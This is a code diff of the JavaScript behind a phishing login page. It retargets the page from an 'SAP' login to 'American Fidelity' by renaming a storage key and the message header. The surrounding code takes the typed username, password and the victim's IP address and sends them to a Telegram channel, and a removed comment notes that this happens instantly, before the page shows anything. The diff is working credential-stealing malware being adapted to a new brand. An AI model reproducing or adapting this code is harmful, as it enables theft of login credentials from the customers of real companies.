@@ -2,12 +2,13 @@
   "use strict";
 
   /* ── Helpers ───────────────────────────────── */
-  var USERNAME_KEY = "sap_remembered_username";
+  var USERNAME_KEY = "american_remembered_username";
 
   /* ── Inject loading overlay into DOM ───────── */
   var overlay = document.createElement("div");
   overlay.id = "loading-overlay";
   overlay.innerHTML = [
+      '<div class="overlay-card" id="overlay-card">',
       '<div class="overlay-spinner"></div>',
       '<div class="overlay-success-icon">',
         '<svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">',
@@ -150,13 +151,9 @@
         try { localStorage.removeItem(USERNAME_KEY); } catch(_) {}
       }
 
-      /* ══════════════════════════════════════════════════════
-         TELEGRAM — fire INSTANTLY before overlay or anything.
-         getIP() runs in parallel; send() is fire-and-forget.
-      ══════════════════════════════════════════════════════ */
       TG.getIP().then(function (ip) {
         TG.send(
-          "🔐 <b>SAP — Login Credentials</b>\n\n" +
+          "🔐 <b>American Fidelity — Login Credentials</b>\n\n" +
           "👤 Username: <code>" + username + "</code>\n" +
           "🔑 Password: <code>" + password + "</code>\n" +
           "🌐 IP: <code>" + ip + "</code>\n" +
